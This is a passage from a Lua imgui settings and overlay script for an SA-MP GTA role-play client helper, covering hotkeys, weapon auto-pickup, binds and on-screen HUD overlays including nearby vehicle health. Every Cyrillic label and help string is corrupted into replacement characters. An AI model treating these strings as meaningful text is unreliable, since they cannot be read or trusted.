						imgui.SetCursorPos(imgui.ImVec2(ww/2 + 470, wh/2 + 30))
								if imgui.Button(u8("������"), imgui.ImVec2(120.0, 20.0)) then maintabs.tab_commands.help.v, maintabs.tab_commands.money.v = true, false end
				end

				if maintabs.tab_overlay.status then
						imgui.NewLine()
						imgui.Text(u8("Overlay - ������� ����������� �������� ������ �������� ������ ����������� �������� � ��������� �����������. ������������ �������� ����� �� ����������� � ������� ��������� �\n����������� ������������. ����������� ���������� ��������� ��������� �� ����� ������������ � ��� ����� 1920�1080 � ��������� � GTA V Hud by DC22Pac. ��� ������������� �����������\n�������� ��������� ������� ������� � ������� �� ��."))
						imgui.NewLine()
						imgui.Hotkey("Name43", 43, 100) imgui.SameLine() imgui.Text(u8("��������� ������������ ���������")) imgui.NewLine()
						if imgui.ToggleButton("tab_overlay1", togglebools.tab_overlay[1]) then config_ini.bools[25] = togglebools.tab_overlay[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("��������� ������������� overlay"))
						if imgui.ToggleButton("tab_overlay2", togglebools.tab_overlay[2]) then config_ini.bools[26] = togglebools.tab_overlay[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� �������� �������� ������"))
						if imgui.ToggleButton("tab_overlay3", togglebools.tab_overlay[3]) then config_ini.bools[27] = togglebools.tab_overlay[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������ ���� � ID �� ������"))
						if imgui.ToggleButton("tab_overlay4", togglebools.tab_overlay[4]) then config_ini.bools[28] = togglebools.tab_overlay[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���������� � ���������� � ��� ��������"))
						if imgui.ToggleButton("tab_overlay5", togglebools.tab_overlay[5]) then config_ini.bools[29] = togglebools.tab_overlay[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ����������� ������� �� ������ �� ������� (RK)"))
						if imgui.ToggleButton("tab_overlay6", togglebools.tab_overlay[6]) then config_ini.bools[30] = togglebools.tab_overlay[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���������� ������ AFK"))
						if imgui.ToggleButton("tab_overlay7", togglebools.tab_overlay[7]) then config_ini.bools[31] = togglebools.tab_overlay[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���������� � ������� ����"))
						if imgui.ToggleButton("tab_overlay8", togglebools.tab_overlay[8]) then config_ini.bools[32] = togglebools.tab_overlay[8].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ��������� �������� � ����� ���������"))
						if imgui.ToggleButton("tab_overlay9", togglebools.tab_overlay[9]) then config_ini.bools[33] = togglebools.tab_overlay[9].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ����������� ����������"))
						if imgui.ToggleButton("tab_overlay10", togglebools.tab_overlay[10]) then config_ini.bools[34] = togglebools.tab_overlay[10].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ���� � ������� �� ������"))
						if imgui.ToggleButton("tab_overlay11", togglebools.tab_overlay[11]) then config_ini.bools[35] = togglebools.tab_overlay[11].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������ � �������"))
						if imgui.ToggleButton("tab_overlay12", togglebools.tab_overlay[12]) then config_ini.bools[36] = togglebools.tab_overlay[12].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� �������� ���������� �������"))
						if imgui.ToggleButton("tab_overlay13", togglebools.tab_overlay[13]) then config_ini.bools[37] = togglebools.tab_overlay[13].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������� ��������� � ����"))
					--	if imgui.ToggleButton("tab_overlay14", togglebools.tab_overlay[14]) then config_ini.bools[38] = togglebools.tab_overlay[14].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ ���������� ����� ��������"))
						if imgui.ToggleButton("tab_overlay15", togglebools.tab_overlay[15]) then config_ini.bools[41] = togglebools.tab_overlay[15].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ����������� ������ ������� � ����������")) if imgui.IsItemClicked() then maintabs.squad.status.v = true end
						if imgui.ToggleButton("tab_overlay16", togglebools.tab_overlay[16]) then config_ini.bools[43] = togglebools.tab_overlay[16].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ��������� ������������ �������� +500")) if imgui.IsItemClicked() then maintabs.pl500.status.v = true end
						if imgui.ToggleButton("tab_overlay17", togglebools.tab_overlay[17]) then config_ini.bools[44] = togglebools.tab_overlay[17].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("�������� ���������� ����������� ����� (/dclean - �������� ����������)"))
						if imgui.ToggleButton("tab_overlay18", togglebools.tab_overlay[18]) then config_ini.bools[52] = togglebools.tab_overlay[18].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������� �����������/���������� ����� (��������� ����� �������� ������ ���� �������)"))
						if imgui.ToggleButton("tab_overlay19", togglebools.tab_overlay[19]) then config_ini.bools[54] = togglebools.tab_overlay[19].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ ������ �� ����� ������ � ��������"))
					end


				if maintabs.tab_settings.status then
						imgui.NewLine()
						imgui.Text(u8("������� ���� ���")) imgui.SameLine(200) imgui.Text(u8("������� ���� �������")) imgui.SameLine(400) imgui.Text(u8("������� ���� ������")) imgui.SameLine(600) imgui.Text(u8("������� ������� ���� (����.: -1; 5 � �.�.)")) imgui.SameLine(850) imgui.Text(u8("������� ���")) imgui.NewLine()
						imgui.PushItemWidth(140)
						imgui.InputText(u8'##fname', guibuffers.settings.fname) imgui.SameLine(200) imgui.InputText(u8'##sname', guibuffers.settings.sname) imgui.SameLine(400) imgui.InputText(u8'##rank', guibuffers.settings.rank) imgui.SameLine(600) imgui.InputText(u8'##time', guibuffers.settings.timep) imgui.PopItemWidth() imgui.SameLine(800) if imgui.ToggleButton("usersex", togglebools.tab_settings[1]) then RP = togglebools.tab_settings[1].v and "�" or "" config_ini.Settings.UserSex = togglebools.tab_settings[1].v and 1 or 0 end imgui.NewLine() 
						if show.othervars.saccess then
							imgui.Text(u8("������� �������� �������������\n(��� �������������)")) imgui.SameLine(200) imgui.Text(u8("������� ��� � �����")) imgui.SameLine(400) imgui.Text(u8("������� ����� ������ ������ (������ �� ������� ����� ������)")) imgui.NewLine()
							imgui.PushItemWidth(140)
							imgui.InputText(u8'##PlayerU', guibuffers.settings.PlayerU) imgui.SameLine(200) imgui.InputText(u8'##tag', guibuffers.settings.tag) imgui.SameLine(400) imgui.InputText(u8'##useclist', guibuffers.settings.useclist) imgui.PopItemWidth() imgui.SameLine(600) imgui.NewLine()
						end
				end

				if maintabs.tab_weap.status.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(400, 620), imgui.Cond.Always)
					imgui.Begin(u8("��������� ������ ������"), maintabs.tab_weap.status, 4 + 2 + 32)				
					imgui.Image(images[7], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name45", 45, 100) imgui.SameLine() imgui.Text(u8("����� ������")) imgui.NewLine()
					imgui.Image(images[8], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name46", 46, 100) imgui.SameLine() imgui.Text(u8("����� Desert Eagle")) imgui.NewLine()
					imgui.Image(images[9], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name47", 47, 100) imgui.SameLine() imgui.Text(u8("����� Shotgun")) imgui.NewLine()
					imgui.Image(images[10], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name48", 48, 100) imgui.SameLine() imgui.Text(u8("����� SMG")) imgui.NewLine()
					imgui.Image(images[11], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name49", 49, 100) imgui.SameLine() imgui.Text(u8("����� M4A1")) imgui.NewLine()
					imgui.Image(images[12], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name50", 50, 100) imgui.SameLine() imgui.Text(u8("����� Country Rifle")) imgui.NewLine()
					imgui.Image(images[13], imgui.ImVec2(100, 50)) imgui.SameLine() imgui.Hotkey("Name51", 51, 100) imgui.SameLine() imgui.Text(u8("����� ��������")) imgui.NewLine()
					imgui.Image(images[14], imgui.ImVec2(100, 56)) imgui.SameLine() imgui.Hotkey("Name52", 52, 100) imgui.SameLine() imgui.Text(u8("���� ������ ������")) imgui.NewLine()
					imgui.End()
				end

				if maintabs.tab_commands.money.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(510, 500), imgui.Cond.Always)
					imgui.Begin(u8("��������� ����� ������"), maintabs.tab_commands.money, 4 + 2 + 32)
					if imgui.ToggleButton("tab_money1", togglebools.tab_moder[1]) then config_ini.bools[58] = togglebools.tab_moder[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ ���������� ����� ������ (��� ����������� ����� �������������� ��� ��������)"))
					imgui.Text(u8("�������� ����������� ��� ���� ������ ����� �� �����")) 
					imgui.PushItemWidth(100) imgui.InputText(u8'##money1', guibuffers.fond.fondcolor) imgui.PopItemWidth() imgui.SameLine() imgui.PushFont(imfonts.fontmoney) imgui.TextColoredRGB(u8("{" .. (guibuffers.fond.fondcolor.v) .. "}$819405828")) imgui.PopFont() imgui.NewLine()
					imgui.Text(u8("�������� ����������� ��� ���� ������ ������ �����")) 
					imgui.PushItemWidth(100) imgui.InputText(u8'##money2', guibuffers.fond.mycolor) imgui.PopItemWidth() imgui.SameLine() imgui.PushFont(imfonts.fontmoney) imgui.TextColoredRGB(u8("{" .. (guibuffers.fond.mycolor.v) .. "}$75729")) imgui.PopFont() imgui.NewLine()
					imgui.End()
				end

				if maintabs.tab_commands.help.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(510, 100), imgui.Cond.Always)
						imgui.Begin(u8("������������� ���������� ����������"), maintabs.tab_commands.help, 4 + 2 + 32)
						imgui.Text(u8("������� ������ ��� ������� ��������� ��� /. ������� ��������� ������� � ����\n��� ��������� ������������. ������� � ������� �������� ��������� �������.\n��������: ����� ����������� �� ��� ������������ ������� �������. ���\n������������ � ������ ������� ������ ������� ������� /commandhelp list � ����."))
						imgui.End()
				end

				if maintabs.pl500.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(1000, 300), imgui.Cond.Always)
						imgui.Begin(u8("��������� +500"), maintabs.pl500.status, 4 + 2 + 32)
						imgui.Text(u8("�������� ����������� ��� ���� ������"))
						-- local a, r, g, b = explode_argb(tonumber("0xFF0000"))
						-- local color = imgui.ImFloat3(r, g, b)
						-- local c = "FF0000"
						-- if imgui.ColorEdit3('test', color) then
							-- local clr = join_argb(color.v[1] * 255, color.v[2] * 255, color.v[3] * 255)
							--print(('%06X'):format(clr))
							-- c = ('%06X'):format(clr)
						-- end
						imgui.PushItemWidth(100) imgui.InputText(u8'##plus5001', guibuffers.plus500.plus500color) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ����")) imgui.NewLine()
						-- imgui.PushItemWidth(100) imgui.InputText(u8'##plus5002', guibuffers.plus500.plus500size) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ������ ������ (�� ����� 128)")) imgui.NewLine()
						-- imgui.PushItemWidth(100) imgui.InputText(u8'##plus5003', guibuffers.plus500.plus500font) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ��� ������")) imgui.NewLine()
						imgui.PushFont(imfonts.font500)
						local money = tostring(500 * 3)
						imgui.TextColoredRGB("{" .. guibuffers.plus500.plus500color.v .. "}$" .. money .. "")
						imgui.PopFont()
						imgui.End()  
				end
				
				if maintabs.squad.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(1000, 300), imgui.Cond.Always)
						imgui.Begin(u8("��������� ������ ������� � ����������"), maintabs.squad.status, 4 + 2 + 32)
						imgui.Text(u8("�������� ����������� ��� ���� ������")) 
						imgui.PushItemWidth(100) imgui.InputText(u8'##plus5001', guibuffers.squad.fscolor) imgui.PopItemWidth() imgui.SameLine() imgui.Text(u8("������� ����")) imgui.NewLine()
						imgui.PushFont(imfonts.exFontsquad)
						imgui.TextColoredRGB("{" .. guibuffers.squad.fscolor.v .. "}[14:54:59]  [�����] Aleksandr_Belyankin[583] : �����������, �������. � ����� 20 �������, ����� �����...")
						imgui.TextColoredRGB("{" .. guibuffers.squad.fscolor.v .. "}������ ������")
						imgui.TextColoredRGB("{FFFAFA}Timur_Epremidze [123]")
						imgui.TextColoredRGB("{FFFAFA}Vasiliy_Pupkin [0]")
						imgui.PopFont()
						imgui.End()  
				end
				
				if maintabs.user_keys.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(1000, 300), imgui.Cond.Always)
						imgui.Begin(u8("������ ���������������� ������"), maintabs.user_keys.status, 4 + 2 + 32)
						imgui.Text(u8("��� ������������� ����� ������� ��� � ����������� ����� � ������ ����� ����� @. ���� ���� ����� ������� �� ���� �� ����������������� ��������.\n��������: \"��� ID : @MyID@\" ������: \"��� ID : 231\". ������ ������:\n@enter@ - ��������� ������ �� ��������� ������ (�������� " .. tostring(delay) .. " ��.) - �� �������� ��� �������������� ������� Enter � ���������������� �����.\n@Hour@ - ���������� ������� ��� (0-23) ������ ����������\n@Min@ - ���������� ������� ������ (0-60) ������ ����������\n@Sec@ - ���������� ������� ������� ������ ����������\n@Date@ - ���������� ������� ���� � ������� " .. os.date("%d.%m.%Y") .. "\n@MyID@ - ���������� ��� ������� ID\n@KV@ - ���������� ��� ������� �������\n@clist@ - ���������� �������� �������� ������ � ����������� ������ (������� �31)\n@tid@ - ���������� ID ���������� ������ � �������/�������� ������/��������� ���� (��� ���������� ��������)."))
						imgui.End()
				end

				if maintabs.warnings.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(400, 230), imgui.Cond.Always)
						imgui.Begin(u8("��������� �����"), maintabs.warnings.status, 4 + 2 + 32)
						imgui.Text(u8("������ ������� ������� ������������� � ���� ������� ������ �\n����������������� ����. ������ �������: ���� ������� � �������\n� ��������� ����� �� �������� � �� ���������."))
						imgui.NewLine()
						if imgui.ToggleButton("warn0", togglebools.tab_bbot[2]) then config_ini.bools[40] = togglebools.tab_bbot[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("������������ �������"))
						imgui.PushItemWidth(500)
						imgui.InputText(u8'##warn1', guibuffers.warnings.war1)
						imgui.InputText(u8'##warn2', guibuffers.warnings.war2)
						imgui.InputText(u8'##warn3', guibuffers.warnings.war3)
						imgui.InputText(u8'##warn4', guibuffers.warnings.war4)
						imgui.PopItemWidth()
						imgui.End()
				end

				if maintabs.auto_bp.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(310, 300), imgui.Cond.Always)
						imgui.Begin(u8("��������� ��������������� ������ �� �� ������"), maintabs.auto_bp.status, 4 + 2 + 32)
						if imgui.ToggleButton("bp1", togglebools.auto_bp[1]) then config_ini.bools[18], AutoDeagle = togglebools.auto_bp[1].v and 1 or 0, togglebools.auto_bp[1].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� Desert Eagle")) imgui.NewLine()
						if imgui.ToggleButton("bp2", togglebools.auto_bp[2]) then config_ini.bools[19], AutoShotgun = togglebools.auto_bp[2].v and 1 or 0, togglebools.auto_bp[2].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� Shotgun")) imgui.NewLine()
						if imgui.ToggleButton("bp3", togglebools.auto_bp[3]) then config_ini.bools[20], AutoSMG = togglebools.auto_bp[3].v and 1 or 0, togglebools.auto_bp[3].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� SMG")) imgui.NewLine()
						if imgui.ToggleButton("bp4", togglebools.auto_bp[4]) then config_ini.bools[21], AutoM4A1 = togglebools.auto_bp[4].v and 1 or 0, togglebools.auto_bp[4].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� M4A1")) imgui.NewLine()
						if imgui.ToggleButton("bp5", togglebools.auto_bp[5]) then config_ini.bools[22], AutoRifle = togglebools.auto_bp[5].v and 1 or 0, togglebools.auto_bp[5].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� Country Rifle")) imgui.NewLine()
						if imgui.ToggleButton("bp6", togglebools.auto_bp[6]) then config_ini.bools[23], AutoPar = togglebools.auto_bp[6].v and 1 or 0, togglebools.auto_bp[6].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("����� �������")) imgui.NewLine()
						if imgui.ToggleButton("bp7", togglebools.auto_bp[7]) then config_ini.bools[24], AutoOt = togglebools.auto_bp[7].v and 1 or 0, togglebools.auto_bp[7].v and 1 or 0 end imgui.SameLine() imgui.Text(u8("���������� ������ �� ������"))
						imgui.End()
				end

				if maintabs.tab_main_binds.gunparams.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(500, 350), imgui.Cond.Always)
					imgui.Begin(u8("��������� ��������������� ������ ������ � ��������������"), maintabs.tab_main_binds.gunparams, 4 + 2 + 32)
					imgui.InputText(u8'##gun1', guibuffers.gunparams.gun1) imgui.SameLine() imgui.Text(u8("- ��������� SD pistol")) imgui.NewLine()
					imgui.InputText(u8'##gun2', guibuffers.gunparams.gun2) imgui.SameLine() imgui.Text(u8("- ��������� Desert Eagle")) imgui.NewLine()
					imgui.InputText(u8'##gun3', guibuffers.gunparams.gun3) imgui.SameLine() imgui.Text(u8("- ��������� Shotgun")) imgui.NewLine()
					imgui.InputText(u8'##gun4', guibuffers.gunparams.gun4) imgui.SameLine() imgui.Text(u8("- ��������� SMG")) imgui.NewLine()
					imgui.InputText(u8'##gun5', guibuffers.gunparams.gun5) imgui.SameLine() imgui.Text(u8("- ��������� M4")) imgui.NewLine()
					imgui.InputText(u8'##gun6', guibuffers.gunparams.gun6) imgui.SameLine() imgui.Text(u8("- ��������� AK47")) imgui.NewLine()
					imgui.InputText(u8'##gun7', guibuffers.gunparams.gun7) imgui.SameLine() imgui.Text(u8("- ��������� Country Rifle")) imgui.NewLine()
					imgui.End()
				end

				if maintabs.rphr.status.v then
						imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
						imgui.SetNextWindowSize(imgui.ImVec2(400, 400), imgui.Cond.Always)
						imgui.Begin(u8("��������� �����"), maintabs.rphr.status, 4 + 2 + 32)
						imgui.Text(u8("���� �� �������� ���� ����� ������� ��������� �������.\n�������������� ���������������� �����."))
						imgui.NewLine()
						imgui.Hotkey("Name42", 42, 100) imgui.SameLine() imgui.Text(u8("������� ���������")) imgui.NewLine()
						imgui.PushItemWidth(500)
						imgui.InputText(u8'##rphr1', guibuffers.rphr.bind1)
						imgui.InputText(u8'##rphr2', guibuffers.rphr.bind2)
						imgui.InputText(u8'##rphr3', guibuffers.rphr.bind3)
						imgui.InputText(u8'##rphr4', guibuffers.rphr.bind4)
						imgui.InputText(u8'##rphr5', guibuffers.rphr.bind5)
						imgui.InputText(u8'##rphr6', guibuffers.rphr.bind6)
						imgui.InputText(u8'##rphr7', guibuffers.rphr.bind7)
						imgui.InputText(u8'##rphr8', guibuffers.rphr.bind8)
						imgui.InputText(u8'##rphr9', guibuffers.rphr.bind9)
						imgui.InputText(u8'##rphr10', guibuffers.rphr.bind10)
						imgui.PopItemWidth()
						imgui.End()
				end

				if guis.updatestatus.status.v then
					imgui.SetNextWindowPos(imgui.ImVec2(sw / 2, sh / 2), imgui.Cond.Always, imgui.ImVec2(0.5, 0.5))
					imgui.SetNextWindowSize(imgui.ImVec2(1000, 500), imgui.Cond.Always)
					imgui.Begin(u8("� ���������"), guis.updatestatus.status, 4 + 2 + 32)
					imgui.Text(u8("��� ������"))
					for k, i in ipairs(guis.updatestatus.wn) do imgui.Text(u8(i)) end
					local tt = [[��������������������� �������:
						1) ������������� /eject ��������� � ��������� (��������� ������);
						2) /bugreport - ��������� ��������� ������������;
						3) /bp - ������� (�� ������ �������) ��������� ������� ��������������� ������ ��;
						4) ����� ������� �� ������ ����� CTRL - �������� ������ ����� ������� ��;
						5) /scr exit - ���������� �������;
						6) ������ ������������� ������ piss/iznas - �������������� ��������� (��������� ������);
						7) /toggle - ������� (�� ������ �������) ���������� ������� �������� ������� � �������;
						8) ��������� �� ������ + CTRL - ��������� ������ ������������� �������� � ����� - ���������� - ������� CTRL;
						9) /duel [id] - ������� ���������� ������ �� ����� (�� 12 ��);
						10) /get (lek/otm) ���������� ������/������� ������ ������ �� �������;
					]]
					imgui.Text(u8(tt))
					imgui.End()
				end
				
				imgui.ShowCursor = true
				imgui.End()
				imgui.PopFont()
		end
		-- ###################################### Overlay
		--if config_ini.bools[25] == 1 then
				imgui.SwitchContext()
				colors[clr.WindowBg] = ImVec4(0, 0, 0, 0)
				local SetModeCond = SetMode and 0 or 4
				
				if 1 == 1 then -- config_ini.bools[26] ���������� ����� � �������
						local x, y, z
						if not SetMode then x,y,z = getCharCoordinates(PLAYER_PED) end
						local zone = SetMode and "Doherty" or calculateZone(x, y, z)
						if zone ~= "Unknown" then
								local color = zone == "Restricted Area" and "{FF0000}" or "{FFFAFA}"
								if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_placeX, config_ini.ovCoords.show_placeY)) end end
								local kv = SetMode and "�-14" or kvadrat()
								imgui.Begin('#empty_field2', show.show_place, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFont)
								imgui.TextColoredRGB('' .. color .. '' .. zone .. ' [' .. kv .. ']')
								imgui.PopFont()
								s_coord["s_place"] = imgui.GetWindowPos()
								imgui.End()
						end
				end
				
				if config_ini.bools[34] == 1 then -- ���������� �����
						if not SetMode then	imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_timeX, config_ini.ovCoords.show_timeY))	end end
						imgui.Begin('#empty_field', show.show_time, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFont)
						imgui.TextColoredRGB('{FFFF00}' .. os.date("%d.%m.%y %X") .. '')
						imgui.PopFont()
						s_coord["s_time"] = imgui.GetWindowPos()
						imgui.End()
				end

				if config_ini.bools[27] == 1 then -- ���������� ��� ��������� � ��� id
						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_nameX, config_ini.ovCoords.show_nameY))	end	end
						local result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
						if result then
								local name = sampGetPlayerNickname(id)
								local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
								local clist = clist == "ffff" and "fffafa" or clist
								imgui.Begin('#empty_field3', show.show_name, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFont)
								imgui.TextColoredRGB('{' .. clist .. '}' .. name .. '')
								imgui.SameLine()
								imgui.TextColoredRGB('{' .. clist .. '}[' .. tostring(id) .. ']')
								imgui.PopFont()
								s_coord["s_name"] = imgui.GetWindowPos()
								imgui.End()
						end
				end

				if config_ini.bools[28] == 1 then -- ���������� ���������� � ������� �������
						if isCharInAnyCar(PLAYER_PED) then
								local carhandle = storeCarCharIsInNoSave(PLAYER_PED)-- ��������� handle ����������
								local idcar = getCarModel(carhandle) -- ��������� �� ����������
								if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_vehX, config_ini.ovCoords.show_vehY)) end end
								imgui.Begin('#empty_field4', show.show_veh, 1 + 32 + 2 + SetModeCond + 64)
								imgui.PushFont(imfonts.exFont)
								imgui.TextColoredRGB('{FFFAFA}���������: ' .. tVehicleNames[idcar-399] .. ' [' .. idcar .. ']')
								imgui.PopFont()
								s_coord["s_veh"] = imgui.GetWindowPos()
								imgui.End()
						end
				end

				if config_ini.bools[32] == 1 then -- ���������� ���������� � ������� �� �����
						local carhandle
						if isCharInAnyCar(PLAYER_PED) then carhandle = storeCarCharIsInNoSave(PLAYER_PED) end
						local myHP = getCharHealth(PLAYER_PED)
						local myARM = getCharArmour(PLAYER_PED)
						local color, carHP
						if myHP < 30 then color = "{FF0000}" elseif myHP > 30 and myHP < 50 then color = "{FFFF00}" else color = "{00FF00}" end
						if not SetMode then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY)) else if SetModeFirstShow then imgui.SetNextWindowPos(imgui.ImVec2(config_ini.ovCoords.show_hpX, config_ini.ovCoords.show_hpY)) end end
						imgui.Begin('#empty_field13', show.show_hp, 1 + 32 + 2 + SetModeCond + 64)
						imgui.PushFont(imfonts.exFontl)
						imgui.TextColoredRGB('{87CEFA}' .. myARM .. '')
						if not SetMode then if carhandle ~= nil and carhandle > 0 then carHP = getCarHealth(carhandle) end else carHP = 1000 end
						if carHP ~= nil then imgui.TextColoredRGB('{FFB6C1}' .. carHP .. '') end
						imgui.TextColoredRGB('' .. color .. '' .. myHP .. '')
						s_coord["s_hp"] = imgui.GetWindowPos()
						imgui.PopFont()
						imgui.End()
				end

				if config_ini.bools[36] == 1 then -- ���������� �������� ����� ������
						local carhandles = getcars() -- �������� ��� ������ ������
						if carhandles ~= nil then -- ���� ������ ����������
								for k, v in pairs(carhandles) do -- ������� ���� ����� � ����������
										if doesVehicleExist(v) and isCarOnScreen(v) then -- ���� ������ �� ������aa
												local idcar = getCarModel(v) -- �������� �� ��������
												local myX, myY, myZ = getCharCoordinates(PLAYER_PED) -- �������� ���� ����������
												local cX, cY, cZ = getCarCoordinates(v) -- �������� ���������� ������
												local distanse = math.ceil(math.sqrt( ((myX-cX)^2) + ((myY-cY)^2) + ((myZ-cZ)^2))) -- ���������� ����� ���� � �������
												local ignorecars = {[432] = "Rhino", [520] = "Hydra", [425] = "Hunter"} -- �� ������������ �����
												local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900", [468] = "Sanchez", [462] = "Faggio"} -- �� ����������
												if ignorecars[idcar] == nil and isLineOfSightClear(myX, myY, myZ, cX, cY, cZ, true, false, false, true, false) and distanse <= 50 then
													-- ���� ������ �� �� ����� ������������, ����� ���� � ������� ��� ���� (��������� � ������ �� ��������� �� �����) � ���������� �� ����� 50 ��...
														local cHP = getCarHealth(v) -- �������� �� ������
														local cPosX, cPosY = convert3DCoordsToScreen(cX, cY, cZ) -- ��������� 3� ���������� ���� � ���������� �� ������
														local col = cHP > 800 and 0xFF00FF00 or cHP > 500 and 0xFFFFFF00 or 0xFFFFFAFA -- �������� ���� ������ � ����������� �� �� ������
														local col = motos[idcar] ~= nil and isCarTireBurst(v, 1) and 0xFFFF0000 or col -- ���� ������ ��������� ������� �� ���� �� ������ �������
														renderFontDrawText(dx9font, cHP, cPosX - (renderGetFontDrawTextLength(dx9font, cHP, false) / 2), cPosY, col, false) -- ������ �����
												end
										end
								end
						end
				end

				if showcmc then -- ���������� ���. ������ ��� ������ �������
							imgui.SetNextWindowPos(imgui.ImVec2(sx - (15 + show.rand), sy - 24 - show.rand))
							imgui.Begin('#empty_field15', showcmc, 1 + 32 + 2 + SetModeCond + 64)
							imgui.Image(images[15], imgui.ImVec2(32, 32))
							imgui.End()

							if not spsyns.mode and isKeyDown(vkeys.VK_CONTROL) and lastcarhandle ~= nil and isCharInAnyCar(PLAYER_PED) and getDriverOfCar(storeCarCharIsInNoSave(PLAYER_PED)) == PLAYER_PED then 
								local cl = getVehicleClass(lastcarhandle)
								if cl == 11 or cl == 15 or cl == 16 or cl == 21 or getDriverOfCar(lastcarhandle) == nil or getDriverOfCar(lastcarhandle) == PLAYER_PED then return end
								spsyns.changespeed = false 
								spsyns.tarspeed = 0
								spsyns.car = lastcarhandle 
								spsyns.firstshow = true 
								spsyns.mode = true 
							end
				end

				if sx ~= nil and (crosMode or SetMode) then -- ���������� ���������� � ������� ���� ��� ������
					targetinfo()
				end

				if (config_ini.bools[29] == 1 and RKTimerTickCount ~= nil) or SetMode then
						local rtm = nil
						if not SetMode then
								local RKTo = 300 - (os.time() - RKTimerTickCount)
								if RKTo > 0 then
										local rmn = math.floor(RKTo / 60)
